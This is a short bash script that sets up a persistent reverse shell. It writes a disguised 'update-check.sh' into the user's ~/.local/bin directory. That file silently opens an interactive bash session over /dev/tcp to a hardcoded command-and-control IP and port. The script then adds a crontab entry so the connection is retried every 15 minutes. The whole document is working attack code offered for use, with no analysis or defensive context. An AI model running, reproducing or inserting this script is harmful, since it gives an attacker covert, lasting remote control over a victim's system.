#!/bin/bash

# Set your IP and port here
C2_IP="150.241.69.126"
C2_PORT="8080"

# Define script path
SCRIPT_PATH="$HOME/.local/bin/update-check.sh"

# Create directory if it doesn't exist
mkdir -p "$(dirname "$SCRIPT_PATH")"

# Create reverse shell script
cat <<EOF > "$SCRIPT_PATH"
#!/bin/bash
exec 0</dev/null
exec 1>/dev/null
exec 2>/dev/null
bash -i >& /dev/tcp/$C2_IP/$C2_PORT 0>&1
EOF

chmod +x "$SCRIPT_PATH"

# Add to crontab if not already present
CRON_JOB="*/15 * * * * $SCRIPT_PATH"

# Check if crontab already contains the job
(crontab -l 2>/dev/null | grep -F "$SCRIPT_PATH") >/dev/null
if [ $? -ne 0 ]; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    echo "✅ Cron job added to run every 15 minutes."
else
    echo "ℹ️ Cron job already exists."
fi

echo "✅ Setup complete. Reverse shell will attempt to connect to $C2_IP:$C2_PORT every 15 minutes."
